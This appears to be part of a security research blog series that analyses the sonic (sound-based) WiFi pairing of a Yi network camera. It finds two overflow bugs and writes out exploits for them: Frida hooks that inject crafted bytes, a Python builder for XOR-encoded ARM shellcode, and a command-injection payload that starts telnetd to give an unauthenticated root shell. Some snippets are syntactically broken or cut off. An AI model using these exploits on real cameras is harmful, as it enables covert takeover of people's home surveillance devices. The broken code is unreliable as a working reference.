# Pairing

On the app when you are setting up the camera, there are a few ways you can get the WiFi credentials to the camera so that it can get onto the Internet:
- QR code
- Send via Hotspot
- Sonic Pairing

## QR Code Pairing

This method basically involves holding a QR code up to the camera, the QR code contains encoded WiFi credentials which are decoded by the camera and then used to connect to the network. 

A bug was found in this parser in another Yi device: 
"*[CVE-2018-3898/3899](https://talosintelligence.com/vulnerability_reports/TALOS-2018-0571)Â allows an attacker to use a specially crafted QR code to cause a buffer overflow, resulting in code execution. An attacker can make the camera scan a QR code to trigger this vulnerability.*"

The generated QR code contains a string with three parts:
- *b* : Corresponds to *bind_key*
- *p* : Corresponds to password
- *s* : Corresponds to SSID

Each part is base64 encoded and concatenated together with the other parts, here is an example:

```
b=EUhj4uNqpvABA6jk&s=TGhw&p=b1EzExcPDFcsMDZoBgZ9Ql8jdGI=
```

I had brief look at the QR-code handling on this camera, and I couldn't find any buffer overflow issues in the handling of scanned credentials (or any other issues) - so I'm assuming this has been patched.

## Send via Hotspot

This method uses the *ap_bind* method we saw in the first couple of blogs, nothing we haven't seen before!

![bind_wireshark.png](/assets/images/analysing_a_wireless_network_camera_part_5/bind_wireshark.png)

## Sonic Pairing

This one is honestly quite cool, the app plays a sound that contains the credentials, the camera receives this sound, decodes it, and connects to the access point. According to the app, its a 'new' feature - which means there is a pretty good chance there will be some dodgy code!

# Bug 1

The first bug itself isn't anything special, another straight-forward **strcpy** stack overflow, but it is made a million times more interesting as its triggered by sound waves!

The sound wave parsing functionality is handled by the **sw_thread** in **anyka_ipc**, this is always listening for sound that resembles the expected format. It uses **wave_fifo_get** and **recognizer** functions to decode and process the received sound. This is then split up into the *ssid*, *pwd* and *bind_key* using *0xa* as a delimiter. Unlike the other methods, the credentials are not base64 encoded.

![sound_wave_parser_ghidra.png](/assets/images/analysing_a_wireless_network_camera_part_5/sound_wave_parser_ghidra.png)

As you can see, the extracted parts are then passed into the **ak_yi_sound_wave_parse** function, where we see a familiar function from the last blog:

![save_wifi_info2tmp.png](/assets/images/analysing_a_wireless_network_camera_part_5/save_wifi_info2tmp.png)

As there aren't any length checks on the incoming data, we can get a large value into the *pwd* buffer, and hit the bug in *save_wifi_info2tmp* we saw in the last blog (*IOTYPE_USER_IPCAM_SET_WIFI_INFO* stack overflow). This is basically another way to hit the same bug.

# Bug 2

We can also overflow the **bind_key** value in the **for_p2p_s.yi_cloud_info** struct, so we can overwrite **did**, **key**, and **p2pid** (as we are limited to 128-ish bytes, more on that later). 

![overflow_bindkey.png](/assets/images/analysing_a_wireless_network_camera_part_5/overflow_bindkey.png)

# PoC 

It would be rude of me not to look into these bugs further, its not every day you come across a bug that gets triggered by a sound! To generate custom sounds, it will definitely be easiest to use Jadx to reverse the app to find where the sound gets generated (or Ghidra if it is in a shared library), and then use Frida to dynamically hook these functions, replacing the data to be encoded with our own!

## Locating Functions

After jumping around in Jadx for a while, I discovered they refer to the sonic pairing sound as *pcm* (pulse-code modulation), this led me to the first useful function: **com.ants360.yicamera.util.PcmUtil.genPcmData**:

![genPcmData_jadx.png](/assets/images/analysing_a_wireless_network_camera_part_5/genPcmData_jadx.png)

This is a native function, so we'll have to have a look at the shared library that implements this function, **libpcmjni.so**:

![genPcmData_ghidra.png](/assets/images/analysing_a_wireless_network_camera_part_5/genPcmData_ghidra.png)

We can see that this function calls **genWaveData** on the source string. It is quite a long function so I won't put it here, but it is essentially generating 'chirps' and doing fft magic, then it writes the generated sound to a *.wav* file.

If we want to PoC these bugs, we need to get our data into the **genWaveData** function.

## Writing Frida Hooks

Now that we have a goal in mind, we can hook the native **genPcmData** function right? Unfortunately not! If you take a look at the function, you'll see lots of UTF-8 mentioned, so the input string gets UTF-8 encoded before it is passed to **genWaveData**. 

This is really annoying as UTF-8 basically blocks anything > 0x7f as it turns it into 2 bytes. As an example, consider the hex string **00 10 20 30 40 50 60 70 80 90 a0 b0 c0 e0 f0** - if we encode this with UTF-8 we get **00 10 20 30 40 50 60 70 c2 80 c2 90 c2 a0 c2 b0 c3 80 c3 a0 c3 b0**.  It doesn't matter for the PoC, but for the exploit we'll definitely want to send values > 0x7f, so best to deal with this now.

We need to go deeper, can we hook the **genWaveData** function and swap the UTF-8 encoded data for our original data? It turns out we can, we need to tell Frida which library to look at, and where the entry point of the function is. We can then write a hook that takes the first argument, and writes the original data to it:

```
-javascript
const ghidraImageBase = 0x100000;
const moduleName = "libpcmjni.so";
const moduleBaseAddress = Module.findBaseAddress(moduleName);
const functionRealAddress = moduleBaseAddress.add(0x103c4c - ghidraImageBase);

Interceptor.attach(functionRealAddress, {
	onEnter: function (args) {
		args[0].writeByteArray([
			0x62, 0xa, 0x41, 0x41,
			0x41, 0x41, 0x41, 0x41,		
			0x41, 0x41, 0x41, 0x41,

		]);
		console.log(hexdump(args[0]));
	},
	onLeave: function(args) {
		console.log("done");
	}
});
```

We still need to hook **genPcmData** to get the correct lengths, and allocate the correct amount of space for the above hook:

```
-javascript
let PcmUtil = Java.use("com.ants360.yicamera.util.PcmUtil");
PcmUtil["genPcmData"].implementation = function (str, str2, i, bVar) {
	console.log(`PcmUtil.genPcmData is called: str=${str}, str2=${str2}, i=${i}, bVar=${bVar}`);

	// Define byte string
	let payload = [0x62, 0x0A,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,	
	0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, // <- r11
	0x41, 0x41, 0x41, 0x41, // <- pc
	0x41, 0x41, 0x41, 0x41,, // <- r3
	0x41, 0x41, 0x41, 0x41,, // <- sp
	0x41, 0x41, 0x41, 0x41,, // <- lr
	0x41, 0x41, 0x41, 0x41,, // <- pc
	0x0A, 0x70];
	
	// Convert the byte array to a Uint8Array (probably unnecessary)
	let byteStringArray = new Uint8Array(payload);
	str2 = '';
	for (let i = 0; i < byteStringArray.length; i++) {
		str2 += String.fromCharCode(byteStringArray[i]);
	}

	// Set the byte string
	i = payload.length;

	console.log(`PcmUtil.genPcmData is called: str=${str}, str2=${str2}, i=${i}, bVar=${bVar}`);

	// Call the original function with modified arguments
	this["genPcmData"](str, str2, i, bVar);
};
```

So with these hooks in place, we can generate sounds to exploit the bugs!

# Bug 1 Exploit

For some reason gdb didn't like showing that this bug caused a segfault and the remote connection dies, but setting a breakpoint at the end of the **save_wifi_info2tmp** function shows that *r11* and *pc* will be popped from the stack and will both be *0x41414141*.

![bug1_poc.png](/assets/images/analysing_a_wireless_network_camera_part_5/bug1_poc.png)

We can also pull the generated wav file with the following command: **adb pull /storage/emulated/0/Android/data/com.yunyi.smartcamera/cache/pcm/sample.wav**

Now that we have got a PoC for the bug going, its time to see if we can exploit the bug to make the camera do something!

When I was testing out larger exploits, the **libpcmjni.so** library refused to generate a wav when the length of the input is greater than 128 bytes - so we are very limited on size. This means I'll have to use the overpowered OOB read from the last blog to work out where our data will be placed in ***libYiP2P.so*** memory. As this memory is executable, we can jump to this and execute a crafted shellcode.

Here is the code I wrote to generate a payload that decodes a few instructions after the decoder and executes them (after sleeping to allow the caches to flush):

```
-python
def generate_light_on_shellcode_payload(payload_start, libc_base, target_length):
	key = 0xfc
	
	# first build payload so that we can give the decoder the correct lengths
	payload_asm = f"""
		ldr r1, =#0x3bfe8
		mov r0, #0x1
		blx r1
		ldr r1, =#{hex(libc_base+0x49c74)}
		mov r0, #0x10
		blx r1
	"""

	payload_assembled = asm(payload_asm, arch='arm', endian="little")

	info("Decoded payload:")
	info(get_hexdump(payload_assembled))

	payload_assembled_bytes = xor_bytes(bytes.fromhex(payload_assembled.hex()), key)

	# get decoder first
	decoder_asm = f"""
	@ Inputs:
	@ r1: Length of the input array
	@ r3: Address of sleep in libc
	@ r6: Address of the input array
	@ r7: Current position
	@ r8: Key for XOR operation

	xor_decode:
		ldmia sp!,{{r3, r4, r5, r6, r7, r8}}
		mov r1, #{hex(len(payload_assembled_bytes))}
		mov r8, #{hex(key)}
		mov r7, r1
	loop:
		ldrb r4, [r6], #1 @ Load byte from input array and increment pointer
		eor r4, r4, r8 @ XOR with the key
		strb r4, [r6, #-1] @ Store the result back in the array (decrementing pointer)
		subs r7, r7, #1 @ Decrement loop counter
		sub r2, r7, #1 @ Subtract 1 from loop counter and check if result is positive or zero
		bpl loop @ If positive or zero, repeat the loop
	sleep:
		mov r5,#0x5
		stmdb sp!,{{r5,lr}}
		ldmia sp!,{{r0,lr}}
		add sp,sp,#0x1000
		blx r3
	"""

	# Assemble the ARM code
	decoder_assembled = asm(decoder_asm, arch='arm')

	# Print the assembled machine code
	decoder_assembled_bytes = bytes.fromhex(decoder_assembled.hex())
	info("Decoder:")
	info(get_hexdump(decoder_assembled_bytes))

	# build payload
	payload = decoder_assembled_bytes + payload_assembled_bytes
	payload += (target_length - len(payload)) * b'\x41'

	info("Constructed payload:")
	info(get_hexdump(payload))

	if ((0xa in payload) or (0x0 in payload)):
		info("BAD CHARS!!!! Needs a reboot :'(")

	return payload
```

I only have space for a very small payload at the moment due to the 128 byte limitation we have. The payload turns on the light of the camera, sleeps for 16 seconds, then crashes - very sophisticated.

If I want to extend the payload, there is some space in the **g_hw_config** structure, and due to the global overflow, we can also overwrite the empty **yi_oss_s** structure - this would give us about 100 more bytes, which would definitely be enough to call **system**, and probably also enough to turn the hotspot back on and receive a larger payload over a socket.

# Bug 2 Exploit

We can trigger the overflow using code similar to what we used to trigger the first bug, except instead of a large SSID we provide a large bind key. And we can cause an overwrite of the **bindkey**, **did** and **key** values in memory. 

![ghidra_global_buffers.png](/assets/images/analysing_a_wireless_network_camera_part_5/ghidra_global_buffers.png)

Remember that after our sound wave gets parsed and the credentials are used to attempt a connection to an access point, there isn't much we can do after this point remotely. Ideally, we want one of these values to be used somehow during the connection process - putting something we control into a use of **system()** would be perfect.

Luckily, this exact scenario occurs with a use of the **key** global after the camera has successfully connected to an access point. Once the camera has connected to the access point, it calls **yi_cloud_init** which contains the following:

![bindkey_check.png](/assets/images/analysing_a_wireless_network_camera_part_5/bindkey_check.png)

To hit the **webapi_do_check_did** call, the first 2 characters of the bind key need to be "CN" - luckily they don't check that the length is 2. If we get into the **webapi_do_check_did** call, we see the following:

![injection_point.png](/assets/images/analysing_a_wireless_network_camera_part_5/injection_point.png)

We see a command being constructed with a few values, the value that is stored at **0x5227b8** is the key value that we have overwritten, which turns the overflow we found into a command injection! The only drawback of this method is that you need to host an access point that does not have an internet connection, I used a router for this.

What can we actually do with this? All we need to do is run **telnetd** on the device and we get a root shell, the username is **root**, and the password is empty. We can monitor devices that have connected to our access point, have another device on the network, and simply login to the telnet session while the camera gets stuck in the while loop waiting for a successful connection that will never happen! Here is the python code that generates the hook payload:

```
-python
def get_sonic_bug_2_frida_hook():
	bind_key = b'CN' + b'a' * 62 + b' & telnetd;'
	ssid = b'wifi_1C98B0'
	pwd = b'helloworld'
	  
	# send in a large bind key, overflow the did, make command do something interesting
	payload_bytes = bind_key + b'\n' + ssid + b'\n' + pwd
	  
	info(f"Payload length: {len(payload_bytes)}")
	  
	if len(payload_bytes) >= 128:
	info("TOO BIG!!")
	  
	return 'let payload = [\n' + as_javascript_array(payload_bytes) + '];'
```

This bug/exploit is much nicer than the previous as it doesn't need to fetch any memory information beforehand, you can just walk up to the camera with a rogue access point, play the sound, login to telnet on the camera, and you've got a root shell! Here is the hook that does the damage:

```
-javascript
let PcmUtil = Java.use("com.ants360.yicamera.util.PcmUtil");
	PcmUtil["genPcmData"].implementation = function (str, str2, i, bVar) {
	console.log(`PcmUtil.genPcmData is called: str=${str}, str2=${str2}, i=${i}, bVar=${bVar}`);
	
	let payload = [
		0x43, 0x4e, 0x61, 0x61,
		0x61, 0x61, 0x61, 0x61,

	];
	
	// Convert the byte array to a Uint8Array
	let byteStringArray = new Uint8Array(payload);
	
	str2 = '';
	for (let i = 0; i < byteStringArray.length; i++) {

	}

# Summary

In this blog, we found a straight-forward stack overflow bug that is triggered by playing a sound at the camera, and wrote a small exploit (with the help of a bug we found in the last blog). We also found an overflow which turned into a command injection, which can be exploited to get a root shell on the device, with the only requirement being within listening range of the camera. We also did a bit of Frida/Jadx which I think is a first in my collection of blogs!
